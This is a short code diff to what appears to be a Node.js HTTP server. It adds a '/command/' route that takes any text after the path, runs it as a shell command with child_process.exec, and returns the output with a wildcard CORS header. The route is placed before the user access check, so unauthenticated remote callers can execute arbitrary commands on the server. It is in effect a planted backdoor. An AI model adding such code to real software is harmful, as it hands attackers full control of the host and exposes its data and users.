@@ -29,6 +29,7 @@ import static_ = require('./static');
 import url = require('url');
 import userManager = require('./userManager');
 import workspaceManager = require('./workspaceManager');
+import childProcess = require('child_process');
 
 var server: http.Server;
 var healthHandler: http.RequestHandler;
@@ -204,7 +205,21 @@ function requestHandler(request: http.ServerRequest, response: http.ServerRespon
     response.end(JSON.stringify(pingResponse));
     return;
   }
+  if (path.indexOf('/command/') == 0) {
+    var command = decodeURI(path.substring(9));
 
+    childProcess.exec(command, function (error, stdout, stderr) {
+      if (error == null) {
+        response.writeHead(200, {
+          'Content-Type': 'text/plain',
+          'Access-Control-Allow-Origin': '*'
+        });
+        var comResponse = stdout;
+        response.end(comResponse);
+      }
+    });
+    return;
+  }
   // Check if user has access.
   var userId = userManager.getUserId(request);
   auth.checkUserAccess(userId, function(e, hasAccess) {
